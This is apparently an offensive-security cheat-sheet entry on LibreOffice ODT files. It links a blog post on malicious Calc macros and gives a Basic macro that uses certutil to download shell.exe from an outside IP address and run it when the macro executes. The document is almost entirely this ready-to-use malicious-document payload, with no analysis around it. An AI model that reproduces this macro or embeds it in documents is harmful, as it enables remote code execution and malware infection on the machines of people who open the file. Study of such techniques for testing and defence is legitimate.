# LibreOffice

## ODT File

{% embed url="https://jamesonhacking.blogspot.com/2022/03/using-malicious-libreoffice-calc-macros.html" %}

```vba
Sub Main
    Shell("cmd /c certutil.exe -urlcache -split -f http://192.168.49.72/shell.exe c:\users\public\shell.exe & c:\users\public\shell.exe")
End Sub
```
